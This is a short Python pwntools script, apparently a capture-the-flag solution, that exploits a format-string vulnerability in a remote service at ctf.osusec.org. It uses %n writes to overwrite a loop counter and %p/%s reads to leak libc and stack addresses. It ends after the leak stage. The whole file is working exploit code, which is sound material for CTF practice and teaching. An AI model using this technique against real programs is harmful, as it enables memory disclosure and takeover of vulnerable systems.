#!/usr/bin/env python
from pwn import *

## %6$p   : count = 1  -0x80(ebp)
## %7$p   : size  = 8  -0x7c(ebp)
## %8$p   : &count     -0x78(ebp)
## %9$p   : &size      -0x74(ebp)
## %10$p  : hex("%10$")

p = remote("ctf.osusec.org", 10005)
p.recvuntil("I'll say it with you...")

## change count to 9 so that we can do format string 8 more times
p.send("%9x%8$n".ljust(7))

## _IO_2_1_stdin_
p.send("%2$p".ljust(7))
p.recvuntil("0x")
leak_libc = p.recvn(8)
libc_stdin = int(leak_libc, 16)       ## _IO_2_1_stdin_
print "_IO_2_1_stdin_ : " + hex(libc_stdin)

## _rtld_global_ro
p.send("%19$p".ljust(7))
p.recvuntil("0x")
leak_libc = p.recvn(8)                ## _rtld_global_ro
libc_rtld = int(leak_libc, 16)  ##
print "_rtld_global_ro : " + hex(libc_rtld)


## libc_start_main_ret
p.send("%41$p".ljust(7))              ## libc = ..
p.recvuntil("0x")
leak_stack = p.recvn(8)
ecx = int(leak_stack, 16)
print "ecx : " + hex(ecx)
main_ret_addr_store = ecx - 4
p.send("%9x%9$n")
p.send("%20x%9$n")

p.recvrepeat(.5)
p.sendline("%00012$s" + p32(ecx - 4))
leak_libc = p.recvn(4)
libc_start_main_ret = u32(leak_libc)
print "__libc_start_main_ret : " + hex(libc_start_main_ret)
